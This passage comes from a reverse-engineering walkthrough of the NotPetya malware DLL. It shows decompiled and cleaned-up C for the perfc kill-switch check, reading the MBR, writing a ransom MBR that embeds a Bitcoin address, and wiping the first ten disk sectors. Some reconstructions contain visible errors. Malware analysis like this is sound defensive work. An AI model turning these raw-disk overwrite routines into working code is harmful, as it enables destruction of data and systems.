        ret = 0;
    }

    else {
        lenDiff = (int)shortBuff - (int)ptrCmdArr;

        do {
            prtCmdArrChar = *ptrCmdArr;
            *(short *)(lenDiff + (int)ptrCmdArr) = prtCmdArrChar;
            ptrCmdArr = ptrCmdArr + 1;
        } while(prtCmdArrChar != 0);

        ret = FUN_10007298(lpCriticalSection,shortBuff,_4bytesVar);
    }
    return ret;
}
```

##### FUN_10007298, FUN_100071d6
`FUN_10007298` is nothing special... we can just see that it's a recursive function inside a critical section. This could have served to maybe delay the malware execution, but the real purpose is unclear. A call to the `FUN_100071d6` function is also made, but even then, nothing really special.

We can simply assume that those functions delay the malware execution, so I'm going to call `FUN_10007298` `delayExecutionWithRecursion`.
Also, `FUN_10006fc7` is nothing special, probably delays the execution too if it finds a valid cmd line argument, so I'm going to call it `checkIfCmdLineNullOrDelay`.

##### Back to FUN_100069a2
Now we can clean up our decompilation to get an idea of what is going on on the `FUN_100069a2`:

```c
uint useCmdLineToDelay(){
    LPCWSTR lpCmdLine;
    LPWSTR *lpCmdLineArr;
    uint bit, ret = 1;

    LPWSTR lpSingleCmdLine;
    int cmdOffset = 0, argsNum = 0;
    
    // Assume the command line stored in EAX into the lpCmdLine variable (simplified)
    lpCmdLine = EAX;

    /* Replace all ';' characters with ' ' on the command line */
    
    lpCmdLineArr = CommandLineToArgvW(lpCmdLine,&argsNum);

    if(lpCmdLineArr != NULL){
        if(argsNum > 0){
            do {
                lpSingleCmdLine = lpCmdLineArr[cmdOffset];
                
                // Do the complex strlen (here simplified)

                if(strlen(lpSingleCmdLine) < 0x10){
                    // We know it returns 0 if not delaied
                    bit = checkIfCmdLineNullOrDelay(globalLpCriticalSection1);
                    ret = ret & bit;
                }

                cmdOffset++;

            } while(cmdOffset < argsNum);
        }

        LocalFree(lpCmdLineArr);
    }

    return ret;
}
```

##### FUN_10006de0
Going back to our `FUN_10006a2b` function, we can see that it also calls the `FUN_10006de0` function after the command line separation (the one with ':').
This function is also pretty self explaining, just check out the ghidra decompilation:

```c
DWORD FUN_10006de0(short *param_1,short *param_2,undefined4 param_3){
    short sVar1;
    LPCRITICAL_SECTION p_Var2;
    HANDLE pvVar3;

    short *psVar4;
    uint dwFlags;
    DWORD DVar5;

    SIZE_T SVar6;
    LPVOID pvVar7;
    LPVOID local_10;

    LPVOID local_c;
    uint local_8;
    
    p_Var2 = globalLpCriticalSection2;
    local_8 = 0;
    psVar4 = param_1;

    do {
        sVar1 = *psVar4;
        psVar4 = psVar4 + 1;
    } while(sVar1 != 0);

    SVar6 = ((int)psVar4 - (int)(param_1 + 1) >> 1) * 2 + 2;
    DVar5 = 8;
    pvVar3 = GetProcessHeap();
    local_10 = HeapAlloc(pvVar3,DVar5,SVar6);

    if(local_10 != (LPVOID)0x0){
        psVar4 = param_1;

        do {
            sVar1 = *psVar4;
            psVar4 = psVar4 + 1;
        } while(sVar1 != 0);

        memcpy(local_10,param_1,((int)psVar4 - (int)(param_1 + 1) >> 1) * 2 + 2);
        psVar4 = param_2;

        do {
            sVar1 = *psVar4;
            psVar4 = psVar4 + 1;
        } while(sVar1 != 0);

        SVar6 = ((int)psVar4 - (int)(param_2 + 1) >> 1) * 2 + 2;
        DVar5 = 8;

        pvVar3 = GetProcessHeap();
        local_c = HeapAlloc(pvVar3,DVar5,SVar6);

        if(local_c != (LPVOID)0x0){
            psVar4 = param_2;

            do {
                sVar1 = *psVar4;
                psVar4 = psVar4 + 1;
            } while(sVar1 != 0);

            memcpy(local_c,param_2,((int)psVar4 - (int)(param_2 + 1) >> 1) * 2 + 2);
            dwFlags = delayExecutionWithRecursion(p_Var2,&local_10,param_3);

            if(dwFlags != 0){
                return dwFlags;
            }

            pvVar7 = local_c;
            local_8 = dwFlags;

            pvVar3 = GetProcessHeap();
            HeapFree(pvVar3,dwFlags,pvVar7);
        }

        DVar5 = 0;
        pvVar7 = local_10;
        pvVar3 = GetProcessHeap();
        HeapFree(pvVar3,DVar5,pvVar7);
    }

    return local_8;
}
```

It's not sure, but we might as well assume that this function also delays the execution, so we can rename it `delayEvenMoreExecution`.

##### Back to FUN_10006a2b
Now we have enough details to get a rough overview of what this function does:

```c
uint parseCmdLineToDelayExecution(LPCWSTR strCmdLine){
    LPWSTR *cmdLineArgs, lpFirstAddr;
    LPCWSTR singleCmdArg;

    int intArg;
    uint argNum, argsNum;
    
    if(strCmdLine != NULL){
        
        /* Weird strlen is performed, here I replaced it with the strlen function to make the code more clear and clean */

        if(strlen(singleCmdArg) != 0){
            argsNum = 0;
            cmdLineArgs = CommandLineToArgvW(strCmdLine,(int *)&argsNum);

            if(cmdLineArgs != NULL){
                if(argsNum > 0){
                    intArg = StrToIntW(*cmdLineArgs);
                    argNum = 1;

                    if(intArg > 0) globalIntArg = intArg;

                    if(argsNum > 1){
                        do {
                            singleCmdArg = cmdLineArgs[argNum];
                            
                            // Check if the command argument is "-h"
                            lpFirstAddr = StrStrW(singleCmdArg,L"-h");

                            if(singleCmdArg == lpFirstAddr){
                                useCmdLineToDelay();
                                break;
                            }

                            // Check if the first argument of the single command line contains some ':' characters
                            lpFirstAddr = StrChrW(singleCmdArg,L':');

                            if(lpFirstAddr != NULL){
                                // Truncate the string at the ':' position
                                *lpFirstAddr = L'\0';
                                delayEvenMoreExecution(singleCmdArg,lpFirstAddr + 1,1);
                            }

                            argNum++;
                        } while (argNum < argsNum);
                    }
                }

                LocalFree(cmdLineArgs);
            }
        }
    }

    // If the first argument is 0, make it 60
    if(globalIntArg == 0) globalIntArg = 0x3c;

    return 0;
}
```

#### stopPetyaIfAlreadyInfected, writeCustomMBR or wipe10sectors
##### Back to Ordinal_1
After the `parseCmdLineToDelayExecution`, a check is made on the second bit of `globalPrivilegesMask`, to check if it's not 0. In this case, a call is made to both `FUN_1000835e` and `FUN_10008d5a` functions. While this may seem random, remeber that `globalPrivilegesMask` is just a check for all the acquired privileges, and the second bit correspond to the `SeDebugPrivilege`. So this if statement just checks if the `SeDebugPrivilege` was acquired. Let's jump into the `FUN_1000835e`.

##### FUN_1000835e
When we enter the function, we can see it calls another function, `FUN_10008320`, and if the return value is not 0, it checks if a file exists, and if it does, it exits the process. If the file doesn't exist, it creates the file. Let's check the `FUN_10008320` function.

##### FUN_10008320
This function is pretty simple, I'll just clean up a bit more the decompilation, and here it is:

```c
int getDllPathWithoutExtension(LPWSTR lpDllPathOut){
    LPWSTR lpDllPath;
    int ret = 0;

    // Look up the dll path, and concatenate it to C:\\Windows\\

    lpDllPath = PathFindFileNameW(&lpFullDllPath);
    lpDllPath = PathCombineW(lpDllPathOut,L"C:\\Windows\\",lpDllPath);

    // If the path could be concatenated
    if(lpDllPath != NULL){

        // Get the first extension char ('.')
        lpDllPath = PathFindExtensionW(lpDllPathOut);

        // If the extension exists, remove it (put the null char)
        if(lpDllPath != NULL){
            *lpDllPath = L'\0';
            ret = 1;
        }
    }

    // Return 1 if success, otherwise 0
    return ret;
}
```

##### Back to FUN_1000835e
Now we can also make sense of the parent function:

```c
bool stopPetyaIfAlreadyInfected(){
    int success;
    bool exists, ret = false;

    HANDLE hFile;
    WCHAR lpDllPath[780];
    
    // Try to acquire the dll full path without the extension
    success = getDllPathWithoutExtension(lpDllPath);

    if(!success){
        // If the file exists, stop the malware entirely
        exists = PathFileExistsW(lpDllPath);
        if(!exists) ExitProcess(0);

        // Else, create the file
        hFile = CreateFileW(lpDllPath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_FLAG_DELETE_ON_CLOSE,NULL);
        ret = (hFile != NULL);
    }

    return ret;
}
```

You may or may have not realized, but NotPetya stops if a file called `"C:\Windows\perfc"` already exists. This probably stops NotPetya to run multiple times on the same computer simultaneously.

Also don't be fooled by the `FILE_FLAG_DELETE_ON_CLOSE` on `CreateFileW`: the file handle is not closed on the function, so it's likely being closed when the main NotPetya's program is teminated.

##### FUN_10008d5a
Time to go investigating on the FUN_10008d5a function. Here we can see the malware tries to get a handle to the Windows main drive volume (C:) with write access, with `FILE_SHARE_WRITE` and FILE_SHARE_READ access. If the opened handle is valid, it uses the `DeviceIoContol` to retrieve the disk information. After that we can see it allocates 10 times the bytes per sector of the drive. If all of that succeeds, it wipes out the second sector of the drive.

After that, it checks via `globalAVFlags` if Kaspersky's `avp.exe` process is not present on the system, and if `FUN_100014a9` returns 0, in which case it simply skip the next function, `FUN_10008cbf`.

Let's check out `FUN_100014a9`.

##### FUN_100014a9
This function, as it is now, is everything but comprehensible. We can see a somewhat kind of dictionary, with characters ranging from 1 to z. But then something caught my eyes: `"1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX"`. After a quick web search, this reveals a Bitcoin wallet address. Something tells me that this has to do something with crypto things.

##### FUN_10001038
In this function we can see some directory and files related functions like `GetSystemDirectoryA`, `CreateFileA`, `DeviceIoControl`. However ghidra doesn't help us there: we cannot find out what the file name is. Even retyping the variable doesn't change the decompilation. However here cutter comes in clutch:

```c
uint32_t __cdecl fcn.10001038(void *s1){
    char cVar1;
    uint32_t uVar2;
    void **ppvVar3;
    size_t sVar4;
    char *pcVar5;
    int32_t iVar6;
    int32_t *piVar7;
    undefined4 *puVar8;
    LPSTR *lpBuffer;
    void *s2;
    undefined4 uStack_164;
    undefined4 uStack_160;
    undefined4 uStack_15c;
    char cStack_158;
    int32_t var_157h;
    LPVOID lpOutBuffer;
    int32_t var_58h;
    void *var_40h;
    LPDWORD lpBytesReturned;
    HANDLE hObject;
    size_t n;
    int32_t var_14h;
    LPCSTR lpFileName;
    int32_t var_ch;
    
    var_14h = 0;
    lpBuffer._0_1_ = 0;
    sub.msvcrt.dll_memset((int32_t)&lpBuffer + 1, 0, 0x103);
    s2 = (void *)((uint32_t)s2 & 0xffffff00);
    sub.msvcrt.dll_memset((int32_t)&s2 + 1, 0, 0x103);
    lpOutBuffer = (LPVOID)0x0;
    piVar7 = &var_58h;
    for (iVar6 = 6; iVar6 != 0; iVar6 = iVar6 + -1) {
        *piVar7 = 0;
        piVar7 = piVar7 + 1;
    }
    var_40h._0_1_ = 0;
    puVar8 = (undefined4 *)((int32_t)&var_40h + 1);
    for (iVar6 = 7; iVar6 != 0; iVar6 = iVar6 + -1) {
        *puVar8 = 0;
        puVar8 = puVar8 + 1;
    }
    *(undefined2 *)puVar8 = 0;
    lpFileName = (LPCSTR)0x5c2e5c5c;
    var_ch._0_2_ = 0x3a30;
    var_ch._2_1_ = 0;
    lpBytesReturned = (LPDWORD)0x0;
    *(undefined *)((int32_t)puVar8 + 2) = 0;
    if (s1 == (void *)0x0) {
        uVar2 = 0xa0;
    } else {
        sub.msvcrt.dll_memset(s1, 0, 0x104);
        s2 = (void *)0x5c2e5c5c;
        uStack_164._0_1_ = 'P';
        uStack_164._1_1_ = 'h';
        uStack_164._2_1_ = 'y';
        uStack_164._3_1_ = 's';
        uStack_160._0_1_ = 'i';
        uStack_160._1_1_ = 'c';
        uStack_160._2_1_ = 'a';
        uStack_160._3_1_ = 'l';
        uStack_15c._0_1_ = 'D';
        uStack_15c._1_1_ = 'r';
        uStack_15c._2_1_ = 'i';
        uStack_15c._3_1_ = 'v';
        cStack_158 = 'e';
        var_157h._0_1_ = 0;
        iVar6 = (*KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);
        if (iVar6 != 0) {
            var_ch._0_2_ = CONCAT11(var_ch._1_1_, lpBuffer._0_1_);
            hObject = (HANDLE)(*KERNEL32.dll_CreateFileA)(&lpFileName, 0, 3, 0, 3, 0, 0);
            if (hObject != (HANDLE)0xffffffff) {
                iVar6 = (*KERNEL32.dll_DeviceIoControl)
                                  (hObject, 0x560000, 0, 0, &lpOutBuffer, 0x20, &lpBytesReturned, 0);
                if (iVar6 == 0) {
                    var_14h = (*KERNEL32.dll_GetLastError)();
                    if (0 < var_14h) {
                        var_14h = var_14h & 0xffffU | 0x80070000;
                    }
                } else {
                    sub.msvcrt.dll__itoa(var_58h, &var_40h, 10);
                    ppvVar3 = &s2;
                    do {
                        cVar1 = *(char *)ppvVar3;
                        ppvVar3 = (void **)((int32_t)ppvVar3 + 1);
                    } while (cVar1 != '\0');
                    uVar2 = (int32_t)ppvVar3 - ((int32_t)&s2 + 1);
                    ppvVar3 = &var_40h;
                    do {
                        cVar1 = *(char *)ppvVar3;
                        ppvVar3 = (void **)((int32_t)ppvVar3 + 1);
                    } while (cVar1 != '\0');
                    sVar4 = (int32_t)ppvVar3 - ((int32_t)&var_40h + 1);
                    n = sVar4;
                    if (sVar4 + 1 + uVar2 < 0x105) {
                        if (uVar2 != 0) {
                            if (0x103 < uVar2) {
                                uVar2 = 0x103;
                            }
                            sub.msvcrt.dll_memcpy(s1, &s2, uVar2);
                            sVar4 = n;
                            *(undefined *)(uVar2 + (int32_t)s1) = 0;
                        }
                        pcVar5 = (char *)s1;
                        do {
                            cVar1 = *pcVar5;
                            pcVar5 = pcVar5 + 1;
                        } while (cVar1 != '\0');
                        iVar6 = (int32_t)pcVar5 - ((int32_t)s1 + 1);
                        if ((sVar4 != 0) && (uVar2 = sVar4 + iVar6, uVar2 < 0x104)) {
                            sub.msvcrt.dll_memcpy(iVar6 + (int32_t)s1, &var_40h, n);
                            *(undefined *)(uVar2 + (int32_t)s1) = 0;
                        }
                    } else {
                        var_14h = -0x7ff8ff86;
                    }
                }
                (*KERNEL32.dll_CloseHandle)(hObject);
                return var_14h;
            }
        }
        uVar2 = (*KERNEL32.dll_GetLastError)();
        if (0 < (int32_t)uVar2) {
            uVar2 = uVar2 & 0xffff | 0x80070000;
        }
    }
    return uVar2;
}
```

Looking at this function we can see a `"\\.\PhisicalDrive"` string. But that's not all. Let's take a look at a portion of the code in the disassembly:

```s
0x10001071      call    sub.msvcrt.dll_memset ; sub.msvcrt.dll_memset ; void *memset(void *s, int c, size_t n)
0x10001076      add     esp, 0x18
0x10001079      push    6                                           ; 6

0x1000107b      pop     ecx
0x1000107c      xor     eax, eax
0x1000107e      lea     edi, [var_58h]

0x10001081      mov     dword [lpOutBuffer], ebx
0x10001084      rep     stosd dword es:[edi], eax
0x10001086      push    7                                           ; 7

0x10001088      mov     byte [var_40h], bl
0x1000108b      pop     ecx
0x1000108c      lea     edi, [var_40h + 0x1]

0x1000108f      rep     stosd dword es:[edi], eax
0x10001091      stosw   word es:[edi], ax
0x10001093      mov     dword [lpFileName], 0x5c2e5c5c              ; '\\.\'

0x1000109a      mov     word [var_ch], 0x3a30                       ; '0:'
0x100010a0      mov     byte [var_ah], bl
0x100010a3      mov     dword [lpBytesReturned], ebx

0x100010a6      stosb   byte es:[edi], al
0x100010a7      cmp     dword [s1], ebx
0x100010aa      je      0x10001221

0x100010b0      push    0x104                                       ; 260 ; size_t n
0x100010b5      push    ebx                                         ; int c
0x100010b6      push    dword [s1]                                  ; void *s

0x100010b9      call    sub.msvcrt.dll_memset ; sub.msvcrt.dll_memset ; void *memset(void *s, int c, size_t n)
0x100010be      mov     esi, str.._PhysicalDrive                    ; 0x1000ff38
0x100010c3      lea     edi, [s2]

0x100010c9      movsd   dword es:[edi], dword ptr [esi]
0x100010ca      movsd   dword es:[edi], dword ptr [esi]
0x100010cb      movsd   dword es:[edi], dword ptr [esi]

0x100010cc      movsd   dword es:[edi], dword ptr [esi]
0x100010cd      add     esp, 0xc
0x100010d0      push    0x104                                       ; 260 ; UINT uSize

0x100010d5      lea     eax, [lpBuffer]
0x100010db      movsb   byte es:[edi], byte ptr [esi]
0x100010dc      push    eax                                         ; LPSTR lpBuffer

0x100010dd      mov     byte [var_157h], bl
0x100010e3      call    dword [GetSystemDirectoryA] ; 0x1000d1b4    ; UINT GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize)
```

Note the addresses `0x10001093` and `0x1000109a`. Cutter actually found two other strings... which is one. Yeah... for some reason the string doesn't render into one, but from what I see in the `CreateFileA`, a drive letter could be passed in order to get a valid device handle.

Now, let' assume that the code increments the character with the number 0 all the way to letters... I'm sure you'll soon find out that this could "loop" through the drives. Anyways, after that a call to `DeviceIoControl` with the control code `IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS` is made. Retyping the `lpOutBuff` to `VOLUME_DISK_EXTENTS` structure cleaned up the decompilation. We can also see an itoa function, taking as parameter the volume starting offset.

Furthermore, we can see that the return value ranges from 0 to some seemingless random logical and and or things.

At this point the general idea is that it gets the volume starting offset while checking for errors, but further details remain quite unknown by now. Maybe with the analisys of the other functions its purpose may become clear. Right now, ghidra's decompilation looks like the following:

```c
DWORD smtWithVolumeStartingOffset(char *someStr){
    char cVar1;
    UINT success;
    DWORD ret;
    BOOL success2;
    undefined4 *puVar3;
    uint uVar4;
    char *strStartingOffsetRef;
    size_t startingOffsetLen;
    int iVar5;
    DISK_EXTENT *lpDiskExtents;
    CHAR lpSystemDir;
    undefined local_26f [263];
    undefined4 local_168;
    undefined4 uStack_164;
    undefined4 uStack_160;
    undefined4 uStack_15c;
    char cStack_158;
    undefined local_157;
    VOLUME_DISK_EXTENTS lpOutBuff;
    char strStartingOffset;
    undefined4 local_3f;
    DWORD lpBytesReturned;
    HANDLE hDevice;
    size_t local_18;
    DWORD lastErr;
    LPCSTR strPreDriveLetter;
    LPCSTR strDriveLetter;
    
    lastErr = 0;
    lpSystemDir = '\0';
    memset(local_26f,0,0x103);
    local_168 = local_168 & 0xffffff00;
    memset((void *)((int)&local_168 + 1),0,0x103);
    lpDiskExtents = &lpOutBuff.Extents;
    lpOutBuff.NumberOfDiskExtents = 0;

    for(iVar5 = 6; lpDiskExtents = (DISK_EXTENT *)&lpDiskExtents->StartingOffset, iVar5 != 0; iVar5 = iVar5 + -1){
        ((_struct_19 *)lpDiskExtents)->LowPart = 0;
    }
    strStartingOffset = '\0';
    puVar3 = &local_3f;

    for(iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1){
        *puVar3 = 0;
        puVar3 = puVar3 + 1;
    }

    *(undefined2 *)puVar3 = 0;
    
    // "\\.\"
    strPreDriveLetter = (LPCSTR)0x5c2e5c5c;

    // "0:"
    strDriveLetter._0_2_ = 0x3a30;
    strDriveLetter._2_1_ = 0;
    lpBytesReturned = 0;

    *(undefined *)((int)puVar3 + 2) = 0;

    // If the string is null
    if(someStr == (char *)0x0){
        ret = 0xa0;
    }
    else {
        // "\\.\PhisicalDrive"
        memset(someStr,0,0x104);
        local_168._0_1_ = '\\';
        local_168._1_1_ = '\\';
        local_168._2_1_ = '.';
        local_168._3_1_ = '\\';
        uStack_164._0_1_ = 'P';
        uStack_164._1_1_ = 'h';
        uStack_164._2_1_ = 'y';
        uStack_164._3_1_ = 's';
        uStack_160._0_1_ = 'i';
        uStack_160._1_1_ = 'c';
        uStack_160._2_1_ = 'a';
        uStack_160._3_1_ = 'l';
        uStack_15c._0_1_ = 'D';
        uStack_15c._1_1_ = 'r';
        uStack_15c._2_1_ = 'i';
        uStack_15c._3_1_ = 'v';
        cStack_158 = 'e';
        local_157 = 0;

        success = GetSystemDirectoryA(&lpSystemDir,0x104);

        if(success != 0){
            strDriveLetter._0_2_ = CONCAT11(strDriveLetter._1_1_,lpSystemDir);
            hDevice = CreateFileA((LPCSTR)&strPreDriveLetter,0,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
            if(hDevice != (HANDLE)0xffffffff){
                success2 = DeviceIoControl(hDevice,0x560000,(LPVOID)0x0,0,&lpOutBuff,0x20,&lpBytesReturned,(LPOVERLAPPED)0x0);
                if(success2 == 0){
                    lastErr = GetLastError();
                    if(0 < (int)lastErr){
                        lastErr = lastErr & 0xffff | 0x80070000;
                    }
                }
                else {
                    // Do something with the disk starting offset
                    _itoa(lpOutBuff.Extents.StartingOffset.s.LowPart,&strStartingOffset,10);
                    puVar3 = &local_168;
                    do {
                        cVar1 = *(char *)puVar3;
                        puVar3 = (undefined4 *)((int)puVar3 + 1);
                    } while(cVar1 != '\0');

                    uVar4 = (int)puVar3 - ((int)&local_168 + 1);
                    strStartingOffsetRef = &strStartingOffset;

                    do {
                        cVar1 = *strStartingOffsetRef;
                        strStartingOffsetRef = strStartingOffsetRef + 1;
                    } while(cVar1 != '\0');

                    startingOffsetLen = (int)strStartingOffsetRef - (int)&local_3f;
                    local_18 = startingOffsetLen;

                    if(startingOffsetLen + 1 + uVar4 < 0x105){
                        if(uVar4 != 0){
                            if(0x103 < uVar4){
                                uVar4 = 0x103;
                            }

                            memcpy(someStr,&local_168,uVar4);
                            startingOffsetLen = local_18;
                            someStr[uVar4] = '\0';
                        }
                        strStartingOffsetRef = someStr;

                        do {
                            cVar1 = *strStartingOffsetRef;
                            strStartingOffsetRef = strStartingOffsetRef + 1;
                        } while(cVar1 != '\0');

                        if((startingOffsetLen != 0) && (uVar4 = startingOffsetLen + ((int)strStartingOffsetRef - (int)(someStr + 1)),uVar4 < 0x104)){
                            memcpy(someStr + ((int)strStartingOffsetRef - (int)(someStr + 1)),&strStartingOffset,local_18);
                            someStr[uVar4] = '\0';
                        }
                    }
                    else {
                        lastErr = 0x8007007a;
                    }
                }

                CloseHandle(hDevice);
                return lastErr;
            }
        }

        ret = GetLastError();
        if (0 < (int)ret) {
            ret = ret & 0xffff | 0x80070000;
        }
    }

    return ret;
}
```

##### FUN_1000122d
Now we can take a look at another function, `FUN_1000122d`.

This function is quite easy to understand, it opens a handle to whatever the string passed by the function is, which could very well be a physiscal drive. It is opened using `GENERIC_READ` and `0x100000`, `FILE_SHARE_WRITE` and `FILE_SHARE_READ`, `OPEN_EXISTING`. Then a call to `DeviceIoControl` is made, requesting `IOCTL_DISK_GET_PARTITION_INFO_EX`.

This function turned out to acquire the partition style of the disk, and now we can also assume that the strange string passed in indeed a physical drive name.
A cleaned up decompilation looks something like this:

```c
DWORD acquirePartitionStyle(LPCSTR lpPhysicalDrive,PARTITION_STYLE lpPartitionStyle){
    HANDLE hDevice;
    BOOL success;
    DWORD ret = 0, lpBytesRead = 0;

    PARTITION_INFORMATION_EX lpOutBuff;

    // In case the physical drive string is empty, return 0x80070057
    if(lpPhysicalDrive == NULL){
        ret = 0x80070057;
    }
    else {
        // Get a handle to the physical drive
        hDevice = CreateFileA(lpPhysicalDrive,(GENERIC_READ | 0x100000),(FILE_SHARE_READ | FILE_SHARE_WRITE),NULL,OPEN_EXISTING,0,NULL);

        // In case of errors, return again this strange mask
        if(hDevice == NULL){
            ret = GetLastError();
            if(ret > 0) ret = ret & 0xffff | 0x80070000;
        }
        else {
            // Try to get the disk partition style
            success = DeviceIoControl(hDevice,IOCTL_DISK_GET_PARTITION_INFO_EX,NULL,0,&lpOutBuff,0x90,&lpBytesRead,NULL);

            if(success == 0){
                ret = GetLastError();
                if(0 < (int)ret) ret = ret & 0xffff | 0x80070000;
            }
            else lpPartitionStyle = lpOutBuff.PartitionStyle;

            CloseHandle(hDevice);
        }
    }

    return ret;
}
```

Now we can go rename `FUN_10001038` `acquirePhysicalDriveNumbe`, and change its parameter name to `lpPhysicalDrive`.

##### FUN_10001424
Now we can go take a look inside `FUN_10001424`. The first things we see are the Crypt related functions. After making sense of all the parameters, this is the final function:

```c
DWORD generateSomeRandomBytes(BYTE *lpBuffer,DWORD dwLen){
    BOOL success;
    HCRYPTPROV hProv;
    
    // Use the default crypto provider
    success = CryptAcquireContextA(&hProv,NULL,NULL,PROV_RSA_FULL,CRYPT_VERIFYCONTEXT);

    // Check the error code (if there is one)
    if(!success){
        globalErrorCode = GetLastError();

        if(globalErrorCode > 0) globalErrorCode = globalErrorCode & 0xffff | 0x80070000;
        if(globalErrorCode < 0) goto release;
    }

    // Generate 60 random bytes
    success = CryptGenRandom(hProv,dwLen,lpBuffer);

    // In case of error during the generation
    if((!success) && (globalErrorCode = GetLastError(), globalErrorCode > 0)) globalErrorCode = globalErrorCode & 0xffff | 0x80070000;

release:
    // Release the context
    if(hProv != NULL) CryptReleaseContext(hProv,0);

    return globalErrorCode;
}
```
##### FUN_100012d5
After that, we can go back to our parent function, and now we can have a look at the `FUN_100012d5` function. We know that the first parameter is the physical drive string, so we'll immediately adjust the function signature. Now we can see that after the usual checks, it gets a handle to the physical drive, sets the file pointer to the start, and reads the first 512 bytes. It's a pretty straightforward function, all it does is read the MBR.

```c
DWORD readMBR(LPCSTR lpPhysicalDrive,void *lpMBR){
    HANDLE hDevice;
    BOOL success;
    DWORD lastError = 0, lpBytesRead = 0;

    // Check if the string is valid
    if(lpPhysicalDrive == NULL){
        lastError = 0x80070057;
    }

    else {
        // Create the MBR buffer, and open a handle to the physical disk
        memset(lpMBR,0,0x200);
        hDevice = CreateFileA(lpPhysicalDrive,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
        
        // Some error handling
        if(hDevice == NULL){
            lastError = GetLastError();
            if(lastError > 0) lastError = lastError & 0xffff | 0x80070000;
        }
        else {
            // Set the file pointer to the start of the disk
            success = SetFilePointerEx(hDevice,0,NULL,FILE_BEGIN);

            // Error handling, again
            if(((success == 0) || (success = ReadFile(hDevice,lpMBR,0x200,&lpBytesRead,NULL), success == 0)) && (lastError = GetLastError(), lastError > 0))
                lastError = lastError & 0xffff | 0x80070000;

            CloseHandle(hDevice);
        }
    }

    return lastError;
}
```

##### FUN_10001384
Going into `FUN_10001384`, we can see that it's similar to `FUN_100012d5`. Cleaning it up results into this:

```c
DWORD writeNewMBR(LPCSTR lpPhysicalDrive,LPCVOID newMBR){
    HANDLE hDevice;
    BOOL success;
    DWORD lastError = 0, lpBytesRead = 0;

    // Same error checking
    if(lpPhysicalDrive == NULL){
        lastError = 0x80070057;
    }

    else {
        // Opening a handle with write permissions
        hFile = CreateFileA(lpPhysicalDrive,(GENERIC_READ | GENERIC_WRITE),(FILE_SHARE_READ | FILE_SHARE_WRITE),NULL,OPEN_EXISTING,0,NULL);

        // Error handling, again
        if(hFile == NULL){
            lastError = GetLastError();
            if(lastError > 0) lastError = lastError & 0xffff | 0x80070000;
        }
        else {
            // Setting the file pointer to the begin, and writing the new MBR
            success = SetFilePointerEx(hFile,0,NULL,FILE_BEGIN);
            if(((success == 0) || (success = WriteFile(hFile,newMBR,0x200,&lpBytesWritten,NULL), success == 0)) && (lastError = GetLastError(), lastError > 0))
                lastError = lastError & 0xffff | 0x80070000;

            CloseHandle(hFile);
        }
    }
    return lastError;
}
```

##### Back to FUN_100014a9
Now that we looked at all the function inside the parent function, we can see a quite interesting variable, I renamed it globalLpPetyaMBRPayload. What makes it interesting, is that if open the address with a hex editor, and scroll down a bit, we can see the main NotPetya's MBR payload. It's safe to assume that this function does nothing more than trying to write the malicious payload on the disk.

After some dynamic analysis I saw that the random bytes generated were used for the `Salsa20 key`, `nonce`, and the `Personal Installation Key`. This function writes the custom MBR payload used to encrypt the drive.

However, it's worth noting that **there is no way the attacker can provide us back with the correct key** to decrypt the drive given our `Personal Installation Key`, because there is no correlation between it and the Salsa20 key.

We have enough information about this function to make sense of it now:

```c
int writeCustomMBR(){
    void* lpMBR, *lpPartitionStyle;
    char lpBitcoinAddress[34], lpPhysicalDrive;
    int ret;
    
    /* Skipping some useless variable declaration... */

    ret = acquirePhysicalDriveNumber(&lpPhysicalDrive);
    if(ret > -1) && (ret = acquirePartitionStyle(&lpPhysicalDrive,(PARTITION_STYLE)&lpPartitionStyle), ret > -1){

        // The MBR gets rewritten if the partition style is an MBR one
        if(lpPartitionStyle == PARTITION_STYLE_MBR){

            /* Generate a random buffer long 60 bytes, this will be the personal installation key */

            ret = readMBR(&lpPhysicalDrive,&lpMBR);

            /* Generate the new malicious MBR */

            /* Generate the Salsa20 key and nonce, in total 40 bytes */

            // Embedd the Bitcoin address
            memcpy(lpBitcoinAddress,"1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX",0x22);

            /* Write the new sectors */
        }
        else {
            ret = 0x80070032;
        }
    }

    globalErrorCode = ret;
    return ret;
}
```

Also, notice the ret variable. If an error occours, the value is not zero.

##### FUN_10008cbf
Let's go back to `FUN_10008d5a`, where now we can check the final function: `FUN_10008cbf`. We can see a handle created to `PhysicalDrive0` with write permissions, acquired the drive geometry, allocates a buffer 10 times the bytes per sectors, and writes them into the disk, while forcefully dismounting it. Cleaned up, the function should look something like that:

```c
int wipe10sectors(){
    HANDLE hDevice, lpBuffer;
    DISK_GEOMETRY lpDriveGeometry;
    DWORD lpReturnedBytes;
    
    // Acquire a handle to the 
    hDevice = CreateFileA("\\\\.\\PhysicalDrive0",GENERIC_WRITE,(FILE_SHARE_READ | FILE_SHARE_WRITE),NULL,OPEN_EXISTING,0,NULL);
    if(hDevice == NULL){

        // Get the disk's bytes per sector, and allocate a buffer 10 times that size
        DeviceIoControl(hDevice,IOCTL_DISK_GET_DRIVE_GEOMETRY,NULL,0,&lpDriveGeometry,0x18,&lpReturnedBytes,NULL);
        lpBuffer = LocalAlloc(0,lpDriveGeometry.BytesPerSector * 10);

        if(lpBuffer != NULL){
            // Wipe the first 10 sector of the disk (the result is an unbootable disk)
            DeviceIoControl(hDevice,FSCTL_DISMOUNT_VOLUME,NULL,0,NULL,0,&lpReturnedBytes,NULL);
            WriteFile(hDevice,lpBuffer,lpDriveGeometry.BytesPerSector * 10,&lpReturnedBytes,NULL);

            LocalFree(lpBuffer);
        }

        CloseHandle(hDevice);
    }
    return;
}
```

##### Back to FUN_10008d5a
Now we can finally see what's going on in this function:

```c
void overwriteMBRorWipeDisk(){
    HANDLE hDevice, lpBuffer;
    BOOL success;ì
    int clean;

    DWORD lpBytesReturned;
    DISK_GEOMETRY lpOutBuffer;
    
    // Get a handle to the C: volume
    hDevice = CreateFileA("\\\\.\\C:",GENERIC_WRITE,(FILE_SHARE_READ | FILE_SHARE_WRITE),NULL,OPEN_EXISTING,0,NULL);

    if(hDevice != NULL){
        // Retrieve drive geometry to get the bytes per sector
